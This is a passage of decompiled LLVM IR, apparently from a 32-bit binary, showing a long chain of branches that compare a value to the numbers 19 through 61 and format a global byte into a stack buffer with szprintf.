  %v2_10003b98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bac = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003bac = zext i8 %v3_10003bac to i32
  %v4_10003bdc = call i32 @szprintf(i32 %v2_10003b98, i32 ptrtoint ([13 x i8]* @global_var_10017c50.80 to i32), i32 %v4_10003bac)
  br label %dec_label_pc_10003be0

dec_label_pc_10003be0:                            ; preds = %dec_label_pc_10003b8c, %dec_label_pc_10003b98
  %v3_10003be4 = icmp eq i32 %v2_10003594, 19
  br i1 %v3_10003be4, label %dec_label_pc_10003bec, label %dec_label_pc_10003c34

dec_label_pc_10003bec:                            ; preds = %dec_label_pc_10003be0
  %v2_10003bec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c00 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003c00 = zext i8 %v3_10003c00 to i32
  %v4_10003c30 = call i32 @szprintf(i32 %v2_10003bec, i32 ptrtoint ([12 x i8]* @global_var_10017c60.81 to i32), i32 %v4_10003c00)
  br label %dec_label_pc_10003c34

dec_label_pc_10003c34:                            ; preds = %dec_label_pc_10003be0, %dec_label_pc_10003bec
  %v3_10003c38 = icmp eq i32 %v2_10003594, 20
  br i1 %v3_10003c38, label %dec_label_pc_10003c40, label %dec_label_pc_10003c88

dec_label_pc_10003c40:                            ; preds = %dec_label_pc_10003c34
  %v2_10003c40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c54 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003c54 = zext i8 %v3_10003c54 to i32
  %v4_10003c84 = call i32 @szprintf(i32 %v2_10003c40, i32 ptrtoint ([12 x i8]* @global_var_10017c6c.82 to i32), i32 %v4_10003c54)
  br label %dec_label_pc_10003c88

dec_label_pc_10003c88:                            ; preds = %dec_label_pc_10003c34, %dec_label_pc_10003c40
  %v3_10003c8c = icmp eq i32 %v2_10003594, 21
  br i1 %v3_10003c8c, label %dec_label_pc_10003c94, label %dec_label_pc_10003cdc

dec_label_pc_10003c94:                            ; preds = %dec_label_pc_10003c88
  %v2_10003c94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ca8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003ca8 = zext i8 %v3_10003ca8 to i32
  %v4_10003cd8 = call i32 @szprintf(i32 %v2_10003c94, i32 ptrtoint ([13 x i8]* @global_var_10017c78.83 to i32), i32 %v4_10003ca8)
  br label %dec_label_pc_10003cdc

dec_label_pc_10003cdc:                            ; preds = %dec_label_pc_10003c88, %dec_label_pc_10003c94
  %v3_10003ce0 = icmp eq i32 %v2_10003594, 22
  br i1 %v3_10003ce0, label %dec_label_pc_10003ce8, label %dec_label_pc_10003d30

dec_label_pc_10003ce8:                            ; preds = %dec_label_pc_10003cdc
  %v2_10003ce8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cfc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003cfc = zext i8 %v3_10003cfc to i32
  %v4_10003d2c = call i32 @szprintf(i32 %v2_10003ce8, i32 ptrtoint ([12 x i8]* @global_var_10017c88.84 to i32), i32 %v4_10003cfc)
  br label %dec_label_pc_10003d30

dec_label_pc_10003d30:                            ; preds = %dec_label_pc_10003cdc, %dec_label_pc_10003ce8
  %v3_10003d34 = icmp eq i32 %v2_10003594, 23
  br i1 %v3_10003d34, label %dec_label_pc_10003d3c, label %dec_label_pc_10003d84

dec_label_pc_10003d3c:                            ; preds = %dec_label_pc_10003d30
  %v2_10003d3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d50 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003d50 = zext i8 %v3_10003d50 to i32
  %v4_10003d80 = call i32 @szprintf(i32 %v2_10003d3c, i32 ptrtoint ([14 x i8]* @global_var_10017c94.85 to i32), i32 %v4_10003d50)
  br label %dec_label_pc_10003d84

dec_label_pc_10003d84:                            ; preds = %dec_label_pc_10003d30, %dec_label_pc_10003d3c
  %v3_10003d88 = icmp eq i32 %v2_10003594, 24
  br i1 %v3_10003d88, label %dec_label_pc_10003d90, label %dec_label_pc_10003dd8

dec_label_pc_10003d90:                            ; preds = %dec_label_pc_10003d84
  %v2_10003d90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003da4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003da4 = zext i8 %v3_10003da4 to i32
  %v4_10003dd4 = call i32 @szprintf(i32 %v2_10003d90, i32 ptrtoint ([11 x i8]* @global_var_10017ca4.86 to i32), i32 %v4_10003da4)
  br label %dec_label_pc_10003dd8

dec_label_pc_10003dd8:                            ; preds = %dec_label_pc_10003d84, %dec_label_pc_10003d90
  %v3_10003ddc = icmp eq i32 %v2_10003594, 25
  br i1 %v3_10003ddc, label %dec_label_pc_10003de4, label %dec_label_pc_10003e2c

dec_label_pc_10003de4:                            ; preds = %dec_label_pc_10003dd8
  %v2_10003de4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003df8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003df8 = zext i8 %v3_10003df8 to i32
  %v4_10003e28 = call i32 @szprintf(i32 %v2_10003de4, i32 ptrtoint ([11 x i8]* @global_var_10017cb0.87 to i32), i32 %v4_10003df8)
  br label %dec_label_pc_10003e2c

dec_label_pc_10003e2c:                            ; preds = %dec_label_pc_10003dd8, %dec_label_pc_10003de4
  %v3_10003e30 = icmp eq i32 %v2_10003594, 26
  br i1 %v3_10003e30, label %dec_label_pc_10003e38, label %dec_label_pc_10003e80

dec_label_pc_10003e38:                            ; preds = %dec_label_pc_10003e2c
  %v2_10003e38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e4c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003e4c = zext i8 %v3_10003e4c to i32
  %v4_10003e7c = call i32 @szprintf(i32 %v2_10003e38, i32 ptrtoint ([12 x i8]* @global_var_10017cbc.88 to i32), i32 %v4_10003e4c)
  br label %dec_label_pc_10003e80

dec_label_pc_10003e80:                            ; preds = %dec_label_pc_10003e2c, %dec_label_pc_10003e38
  %v3_10003e84 = icmp eq i32 %v2_10003594, 27
  br i1 %v3_10003e84, label %dec_label_pc_10003e8c, label %dec_label_pc_10003ed4

dec_label_pc_10003e8c:                            ; preds = %dec_label_pc_10003e80
  %v2_10003e8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ea0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003ea0 = zext i8 %v3_10003ea0 to i32
  %v4_10003ed0 = call i32 @szprintf(i32 %v2_10003e8c, i32 ptrtoint ([12 x i8]* @global_var_10017cc8.89 to i32), i32 %v4_10003ea0)
  br label %dec_label_pc_10003ed4

dec_label_pc_10003ed4:                            ; preds = %dec_label_pc_10003e80, %dec_label_pc_10003e8c
  %v3_10003ed8 = icmp eq i32 %v2_10003594, 28
  br i1 %v3_10003ed8, label %dec_label_pc_10003ee0, label %dec_label_pc_10003f28

dec_label_pc_10003ee0:                            ; preds = %dec_label_pc_10003ed4
  %v2_10003ee0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ef4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003ef4 = zext i8 %v3_10003ef4 to i32
  %v4_10003f24 = call i32 @szprintf(i32 %v2_10003ee0, i32 ptrtoint ([12 x i8]* @global_var_10017cd4.90 to i32), i32 %v4_10003ef4)
  br label %dec_label_pc_10003f28

dec_label_pc_10003f28:                            ; preds = %dec_label_pc_10003ed4, %dec_label_pc_10003ee0
  %v3_10003f2c = icmp eq i32 %v2_10003594, 29
  br i1 %v3_10003f2c, label %dec_label_pc_10003f34, label %dec_label_pc_10003f7c

dec_label_pc_10003f34:                            ; preds = %dec_label_pc_10003f28
  %v2_10003f34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f48 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003f48 = zext i8 %v3_10003f48 to i32
  %v4_10003f78 = call i32 @szprintf(i32 %v2_10003f34, i32 ptrtoint ([13 x i8]* @global_var_10017ce0.91 to i32), i32 %v4_10003f48)
  br label %dec_label_pc_10003f7c

dec_label_pc_10003f7c:                            ; preds = %dec_label_pc_10003f28, %dec_label_pc_10003f34
  %v3_10003f80 = icmp eq i32 %v2_10003594, 30
  br i1 %v3_10003f80, label %dec_label_pc_10003f88, label %dec_label_pc_10003fd0

dec_label_pc_10003f88:                            ; preds = %dec_label_pc_10003f7c
  %v2_10003f88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f9c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003f9c = zext i8 %v3_10003f9c to i32
  %v4_10003fcc = call i32 @szprintf(i32 %v2_10003f88, i32 ptrtoint ([13 x i8]* @global_var_10017cf0.92 to i32), i32 %v4_10003f9c)
  br label %dec_label_pc_10003fd0

dec_label_pc_10003fd0:                            ; preds = %dec_label_pc_10003f7c, %dec_label_pc_10003f88
  %v3_10003fd4 = icmp eq i32 %v2_10003594, 31
  br i1 %v3_10003fd4, label %dec_label_pc_10003fdc, label %dec_label_pc_10004024

dec_label_pc_10003fdc:                            ; preds = %dec_label_pc_10003fd0
  %v2_10003fdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ff0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10003ff0 = zext i8 %v3_10003ff0 to i32
  %v4_10004020 = call i32 @szprintf(i32 %v2_10003fdc, i32 ptrtoint ([14 x i8]* @global_var_10017d00.93 to i32), i32 %v4_10003ff0)
  br label %dec_label_pc_10004024

dec_label_pc_10004024:                            ; preds = %dec_label_pc_10003fd0, %dec_label_pc_10003fdc
  %v3_10004028 = icmp eq i32 %v2_10003594, 32
  br i1 %v3_10004028, label %dec_label_pc_10004030, label %dec_label_pc_10004078

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10004024
  %v2_10004030 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004044 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004044 = zext i8 %v3_10004044 to i32
  %v4_10004074 = call i32 @szprintf(i32 %v2_10004030, i32 ptrtoint ([14 x i8]* @global_var_10017d10.94 to i32), i32 %v4_10004044)
  br label %dec_label_pc_10004078

dec_label_pc_10004078:                            ; preds = %dec_label_pc_10004024, %dec_label_pc_10004030
  %v3_1000407c = icmp eq i32 %v2_10003594, 33
  br i1 %v3_1000407c, label %dec_label_pc_10004084, label %dec_label_pc_100040cc

dec_label_pc_10004084:                            ; preds = %dec_label_pc_10004078
  %v2_10004084 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004098 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004098 = zext i8 %v3_10004098 to i32
  %v4_100040c8 = call i32 @szprintf(i32 %v2_10004084, i32 ptrtoint ([13 x i8]* @global_var_10017d20.95 to i32), i32 %v4_10004098)
  br label %dec_label_pc_100040cc

dec_label_pc_100040cc:                            ; preds = %dec_label_pc_10004078, %dec_label_pc_10004084
  %v3_100040d0 = icmp eq i32 %v2_10003594, 34
  br i1 %v3_100040d0, label %dec_label_pc_100040d8, label %dec_label_pc_10004120

dec_label_pc_100040d8:                            ; preds = %dec_label_pc_100040cc
  %v2_100040d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040ec = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100040ec = zext i8 %v3_100040ec to i32
  %v4_1000411c = call i32 @szprintf(i32 %v2_100040d8, i32 ptrtoint ([13 x i8]* @global_var_10017d30.96 to i32), i32 %v4_100040ec)
  br label %dec_label_pc_10004120

dec_label_pc_10004120:                            ; preds = %dec_label_pc_100040cc, %dec_label_pc_100040d8
  %v3_10004124 = icmp eq i32 %v2_10003594, 35
  br i1 %v3_10004124, label %dec_label_pc_1000412c, label %dec_label_pc_10004174

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_10004120
  %v2_1000412c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004140 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004140 = zext i8 %v3_10004140 to i32
  %v4_10004170 = call i32 @szprintf(i32 %v2_1000412c, i32 ptrtoint ([13 x i8]* @global_var_10017d40.97 to i32), i32 %v4_10004140)
  br label %dec_label_pc_10004174

dec_label_pc_10004174:                            ; preds = %dec_label_pc_10004120, %dec_label_pc_1000412c
  %v3_10004178 = icmp eq i32 %v2_10003594, 36
  br i1 %v3_10004178, label %dec_label_pc_10004180, label %dec_label_pc_100041c8

dec_label_pc_10004180:                            ; preds = %dec_label_pc_10004174
  %v2_10004180 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004194 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004194 = zext i8 %v3_10004194 to i32
  %v4_100041c4 = call i32 @szprintf(i32 %v2_10004180, i32 ptrtoint ([13 x i8]* @global_var_10017d50.98 to i32), i32 %v4_10004194)
  br label %dec_label_pc_100041c8

dec_label_pc_100041c8:                            ; preds = %dec_label_pc_10004174, %dec_label_pc_10004180
  %v3_100041cc = icmp eq i32 %v2_10003594, 37
  br i1 %v3_100041cc, label %dec_label_pc_100041d4, label %dec_label_pc_1000421c

dec_label_pc_100041d4:                            ; preds = %dec_label_pc_100041c8
  %v2_100041d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041e8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100041e8 = zext i8 %v3_100041e8 to i32
  %v4_10004218 = call i32 @szprintf(i32 %v2_100041d4, i32 ptrtoint ([13 x i8]* @global_var_10017d60.99 to i32), i32 %v4_100041e8)
  br label %dec_label_pc_1000421c

dec_label_pc_1000421c:                            ; preds = %dec_label_pc_100041c8, %dec_label_pc_100041d4
  %v3_10004220 = icmp eq i32 %v2_10003594, 38
  br i1 %v3_10004220, label %dec_label_pc_10004228, label %dec_label_pc_10004270

dec_label_pc_10004228:                            ; preds = %dec_label_pc_1000421c
  %v2_10004228 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000423c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000423c = zext i8 %v3_1000423c to i32
  %v4_1000426c = call i32 @szprintf(i32 %v2_10004228, i32 ptrtoint ([13 x i8]* @global_var_10017d70.100 to i32), i32 %v4_1000423c)
  br label %dec_label_pc_10004270

dec_label_pc_10004270:                            ; preds = %dec_label_pc_1000421c, %dec_label_pc_10004228
  %v3_10004274 = icmp eq i32 %v2_10003594, 39
  br i1 %v3_10004274, label %dec_label_pc_1000427c, label %dec_label_pc_100042c4

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004270
  %v2_1000427c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004290 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004290 = zext i8 %v3_10004290 to i32
  %v4_100042c0 = call i32 @szprintf(i32 %v2_1000427c, i32 ptrtoint ([13 x i8]* @global_var_10017d80.101 to i32), i32 %v4_10004290)
  br label %dec_label_pc_100042c4

dec_label_pc_100042c4:                            ; preds = %dec_label_pc_10004270, %dec_label_pc_1000427c
  %v3_100042c8 = icmp eq i32 %v2_10003594, 40
  br i1 %v3_100042c8, label %dec_label_pc_100042d0, label %dec_label_pc_10004318

dec_label_pc_100042d0:                            ; preds = %dec_label_pc_100042c4
  %v2_100042d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042e4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100042e4 = zext i8 %v3_100042e4 to i32
  %v4_10004314 = call i32 @szprintf(i32 %v2_100042d0, i32 ptrtoint ([14 x i8]* @global_var_10017d90.102 to i32), i32 %v4_100042e4)
  br label %dec_label_pc_10004318

dec_label_pc_10004318:                            ; preds = %dec_label_pc_100042c4, %dec_label_pc_100042d0
  %v3_1000431c = icmp eq i32 %v2_10003594, 41
  br i1 %v3_1000431c, label %dec_label_pc_10004324, label %dec_label_pc_1000436c

dec_label_pc_10004324:                            ; preds = %dec_label_pc_10004318
  %v2_10004324 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004338 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004338 = zext i8 %v3_10004338 to i32
  %v4_10004368 = call i32 @szprintf(i32 %v2_10004324, i32 ptrtoint ([13 x i8]* @global_var_10017da0.103 to i32), i32 %v4_10004338)
  br label %dec_label_pc_1000436c

dec_label_pc_1000436c:                            ; preds = %dec_label_pc_10004318, %dec_label_pc_10004324
  %v3_10004370 = icmp eq i32 %v2_10003594, 42
  br i1 %v3_10004370, label %dec_label_pc_10004378, label %dec_label_pc_100043c0

dec_label_pc_10004378:                            ; preds = %dec_label_pc_1000436c
  %v2_10004378 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000438c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000438c = zext i8 %v3_1000438c to i32
  %v4_100043bc = call i32 @szprintf(i32 %v2_10004378, i32 ptrtoint ([13 x i8]* @global_var_10017db0.104 to i32), i32 %v4_1000438c)
  br label %dec_label_pc_100043c0

dec_label_pc_100043c0:                            ; preds = %dec_label_pc_1000436c, %dec_label_pc_10004378
  %v3_100043c4 = icmp eq i32 %v2_10003594, 43
  br i1 %v3_100043c4, label %dec_label_pc_100043cc, label %dec_label_pc_10004414

dec_label_pc_100043cc:                            ; preds = %dec_label_pc_100043c0
  %v2_100043cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043e0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100043e0 = zext i8 %v3_100043e0 to i32
  %v4_10004410 = call i32 @szprintf(i32 %v2_100043cc, i32 ptrtoint ([13 x i8]* @global_var_10017dc0.105 to i32), i32 %v4_100043e0)
  br label %dec_label_pc_10004414

dec_label_pc_10004414:                            ; preds = %dec_label_pc_100043c0, %dec_label_pc_100043cc
  %v3_10004418 = icmp eq i32 %v2_10003594, 44
  br i1 %v3_10004418, label %dec_label_pc_10004420, label %dec_label_pc_10004468

dec_label_pc_10004420:                            ; preds = %dec_label_pc_10004414
  %v2_10004420 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004434 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004434 = zext i8 %v3_10004434 to i32
  %v4_10004464 = call i32 @szprintf(i32 %v2_10004420, i32 ptrtoint ([13 x i8]* @global_var_10017dd0.106 to i32), i32 %v4_10004434)
  br label %dec_label_pc_10004468

dec_label_pc_10004468:                            ; preds = %dec_label_pc_10004414, %dec_label_pc_10004420
  %v3_1000446c = icmp eq i32 %v2_10003594, 45
  br i1 %v3_1000446c, label %dec_label_pc_10004474, label %dec_label_pc_100044bc

dec_label_pc_10004474:                            ; preds = %dec_label_pc_10004468
  %v2_10004474 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004488 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004488 = zext i8 %v3_10004488 to i32
  %v4_100044b8 = call i32 @szprintf(i32 %v2_10004474, i32 ptrtoint ([13 x i8]* @global_var_10017de0.107 to i32), i32 %v4_10004488)
  br label %dec_label_pc_100044bc

dec_label_pc_100044bc:                            ; preds = %dec_label_pc_10004468, %dec_label_pc_10004474
  %v3_100044c0 = icmp eq i32 %v2_10003594, 46
  br i1 %v3_100044c0, label %dec_label_pc_100044c8, label %dec_label_pc_10004510

dec_label_pc_100044c8:                            ; preds = %dec_label_pc_100044bc
  %v2_100044c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044dc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100044dc = zext i8 %v3_100044dc to i32
  %v4_1000450c = call i32 @szprintf(i32 %v2_100044c8, i32 ptrtoint ([13 x i8]* @global_var_10017df0.108 to i32), i32 %v4_100044dc)
  br label %dec_label_pc_10004510

dec_label_pc_10004510:                            ; preds = %dec_label_pc_100044bc, %dec_label_pc_100044c8
  %v3_10004514 = icmp eq i32 %v2_10003594, 47
  br i1 %v3_10004514, label %dec_label_pc_1000451c, label %dec_label_pc_10004564

dec_label_pc_1000451c:                            ; preds = %dec_label_pc_10004510
  %v2_1000451c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004530 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004530 = zext i8 %v3_10004530 to i32
  %v4_10004560 = call i32 @szprintf(i32 %v2_1000451c, i32 ptrtoint ([14 x i8]* @global_var_10017e00.109 to i32), i32 %v4_10004530)
  br label %dec_label_pc_10004564

dec_label_pc_10004564:                            ; preds = %dec_label_pc_10004510, %dec_label_pc_1000451c
  %v3_10004568 = icmp eq i32 %v2_10003594, 48
  br i1 %v3_10004568, label %dec_label_pc_10004570, label %dec_label_pc_100045b8

dec_label_pc_10004570:                            ; preds = %dec_label_pc_10004564
  %v2_10004570 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004584 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004584 = zext i8 %v3_10004584 to i32
  %v4_100045b4 = call i32 @szprintf(i32 %v2_10004570, i32 ptrtoint ([13 x i8]* @global_var_10017e10.110 to i32), i32 %v4_10004584)
  br label %dec_label_pc_100045b8

dec_label_pc_100045b8:                            ; preds = %dec_label_pc_10004564, %dec_label_pc_10004570
  %v3_100045bc = icmp eq i32 %v2_10003594, 49
  br i1 %v3_100045bc, label %dec_label_pc_100045c4, label %dec_label_pc_1000460c

dec_label_pc_100045c4:                            ; preds = %dec_label_pc_100045b8
  %v2_100045c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045d8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100045d8 = zext i8 %v3_100045d8 to i32
  %v4_10004608 = call i32 @szprintf(i32 %v2_100045c4, i32 ptrtoint ([14 x i8]* @global_var_10017e20.111 to i32), i32 %v4_100045d8)
  br label %dec_label_pc_1000460c

dec_label_pc_1000460c:                            ; preds = %dec_label_pc_100045b8, %dec_label_pc_100045c4
  %v3_10004610 = icmp eq i32 %v2_10003594, 50
  br i1 %v3_10004610, label %dec_label_pc_10004618, label %dec_label_pc_10004660

dec_label_pc_10004618:                            ; preds = %dec_label_pc_1000460c
  %v2_10004618 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000462c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000462c = zext i8 %v3_1000462c to i32
  %v4_1000465c = call i32 @szprintf(i32 %v2_10004618, i32 ptrtoint ([14 x i8]* @global_var_10017e30.112 to i32), i32 %v4_1000462c)
  br label %dec_label_pc_10004660

dec_label_pc_10004660:                            ; preds = %dec_label_pc_1000460c, %dec_label_pc_10004618
  %v3_10004664 = icmp eq i32 %v2_10003594, 51
  br i1 %v3_10004664, label %dec_label_pc_1000466c, label %dec_label_pc_100046b4

dec_label_pc_1000466c:                            ; preds = %dec_label_pc_10004660
  %v2_1000466c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004680 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004680 = zext i8 %v3_10004680 to i32
  %v4_100046b0 = call i32 @szprintf(i32 %v2_1000466c, i32 ptrtoint ([14 x i8]* @global_var_10017e40.113 to i32), i32 %v4_10004680)
  br label %dec_label_pc_100046b4

dec_label_pc_100046b4:                            ; preds = %dec_label_pc_10004660, %dec_label_pc_1000466c
  %v3_100046b8 = icmp eq i32 %v2_10003594, 52
  br i1 %v3_100046b8, label %dec_label_pc_100046c0, label %dec_label_pc_10004708

dec_label_pc_100046c0:                            ; preds = %dec_label_pc_100046b4
  %v2_100046c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046d4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100046d4 = zext i8 %v3_100046d4 to i32
  %v4_10004704 = call i32 @szprintf(i32 %v2_100046c0, i32 ptrtoint ([14 x i8]* @global_var_10017e50.114 to i32), i32 %v4_100046d4)
  br label %dec_label_pc_10004708

dec_label_pc_10004708:                            ; preds = %dec_label_pc_100046b4, %dec_label_pc_100046c0
  %v3_1000470c = icmp eq i32 %v2_10003594, 53
  br i1 %v3_1000470c, label %dec_label_pc_10004714, label %dec_label_pc_1000475c

dec_label_pc_10004714:                            ; preds = %dec_label_pc_10004708
  %v2_10004714 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004728 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004728 = zext i8 %v3_10004728 to i32
  %v4_10004758 = call i32 @szprintf(i32 %v2_10004714, i32 ptrtoint ([13 x i8]* @global_var_10017e60.115 to i32), i32 %v4_10004728)
  br label %dec_label_pc_1000475c

dec_label_pc_1000475c:                            ; preds = %dec_label_pc_10004708, %dec_label_pc_10004714
  %v3_10004760 = icmp eq i32 %v2_10003594, 54
  br i1 %v3_10004760, label %dec_label_pc_10004768, label %dec_label_pc_100047b0

dec_label_pc_10004768:                            ; preds = %dec_label_pc_1000475c
  %v2_10004768 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000477c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000477c = zext i8 %v3_1000477c to i32
  %v4_100047ac = call i32 @szprintf(i32 %v2_10004768, i32 ptrtoint ([14 x i8]* @global_var_10017e70.116 to i32), i32 %v4_1000477c)
  br label %dec_label_pc_100047b0

dec_label_pc_100047b0:                            ; preds = %dec_label_pc_1000475c, %dec_label_pc_10004768
  %v3_100047b4 = icmp eq i32 %v2_10003594, 55
  br i1 %v3_100047b4, label %dec_label_pc_100047bc, label %dec_label_pc_10004804

dec_label_pc_100047bc:                            ; preds = %dec_label_pc_100047b0
  %v2_100047bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047d0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100047d0 = zext i8 %v3_100047d0 to i32
  %v4_10004800 = call i32 @szprintf(i32 %v2_100047bc, i32 ptrtoint ([14 x i8]* @global_var_10017e80.117 to i32), i32 %v4_100047d0)
  br label %dec_label_pc_10004804

dec_label_pc_10004804:                            ; preds = %dec_label_pc_100047b0, %dec_label_pc_100047bc
  %v3_10004808 = icmp eq i32 %v2_10003594, 56
  br i1 %v3_10004808, label %dec_label_pc_10004810, label %dec_label_pc_10004858

dec_label_pc_10004810:                            ; preds = %dec_label_pc_10004804
  %v2_10004810 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004824 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004824 = zext i8 %v3_10004824 to i32
  %v4_10004854 = call i32 @szprintf(i32 %v2_10004810, i32 ptrtoint ([14 x i8]* @global_var_10017e90.118 to i32), i32 %v4_10004824)
  br label %dec_label_pc_10004858

dec_label_pc_10004858:                            ; preds = %dec_label_pc_10004804, %dec_label_pc_10004810
  %v3_1000485c = icmp eq i32 %v2_10003594, 57
  br i1 %v3_1000485c, label %dec_label_pc_10004864, label %dec_label_pc_100048ac

dec_label_pc_10004864:                            ; preds = %dec_label_pc_10004858
  %v2_10004864 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004878 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004878 = zext i8 %v3_10004878 to i32
  %v4_100048a8 = call i32 @szprintf(i32 %v2_10004864, i32 ptrtoint ([14 x i8]* @global_var_10017ea0.119 to i32), i32 %v4_10004878)
  br label %dec_label_pc_100048ac

dec_label_pc_100048ac:                            ; preds = %dec_label_pc_10004858, %dec_label_pc_10004864
  %v3_100048b0 = icmp eq i32 %v2_10003594, 58
  br i1 %v3_100048b0, label %dec_label_pc_100048b8, label %dec_label_pc_10004900

dec_label_pc_100048b8:                            ; preds = %dec_label_pc_100048ac
  %v2_100048b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048cc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100048cc = zext i8 %v3_100048cc to i32
  %v4_100048fc = call i32 @szprintf(i32 %v2_100048b8, i32 ptrtoint ([14 x i8]* @global_var_10017eb0.120 to i32), i32 %v4_100048cc)
  br label %dec_label_pc_10004900

dec_label_pc_10004900:                            ; preds = %dec_label_pc_100048ac, %dec_label_pc_100048b8
  %v3_10004904 = icmp eq i32 %v2_10003594, 59
  br i1 %v3_10004904, label %dec_label_pc_1000490c, label %dec_label_pc_10004954

dec_label_pc_1000490c:                            ; preds = %dec_label_pc_10004900
  %v2_1000490c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004920 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004920 = zext i8 %v3_10004920 to i32
  %v4_10004950 = call i32 @szprintf(i32 %v2_1000490c, i32 ptrtoint ([14 x i8]* @global_var_10017ec0.121 to i32), i32 %v4_10004920)
  br label %dec_label_pc_10004954

dec_label_pc_10004954:                            ; preds = %dec_label_pc_10004900, %dec_label_pc_1000490c
  %v3_10004958 = icmp eq i32 %v2_10003594, 60
  br i1 %v3_10004958, label %dec_label_pc_10004960, label %dec_label_pc_100049a8

dec_label_pc_10004960:                            ; preds = %dec_label_pc_10004954
  %v2_10004960 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004974 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004974 = zext i8 %v3_10004974 to i32
  %v4_100049a4 = call i32 @szprintf(i32 %v2_10004960, i32 ptrtoint ([13 x i8]* @global_var_10017ed0.122 to i32), i32 %v4_10004974)
  br label %dec_label_pc_100049a8

dec_label_pc_100049a8:                            ; preds = %dec_label_pc_10004954, %dec_label_pc_10004960
  %v3_100049ac = icmp eq i32 %v2_10003594, 61
  br i1 %v3_100049ac, label %dec_label_pc_100049b4, label %dec_label_pc_100049fc

dec_label_pc_100049b4:                            ; preds = %dec_label_pc_100049a8
  %v2_100049b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049c8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100049c8 = zext i8 %v3_100049c8 to i32
  %v4_100049f8 = call i32 @szprintf(i32 %v2_100049b4, i32 ptrtoint ([14 x i8]* @global_var_10017ee0.123 to i32), i32 %v4_100049c8)
  br label %dec_label_pc_100049fc

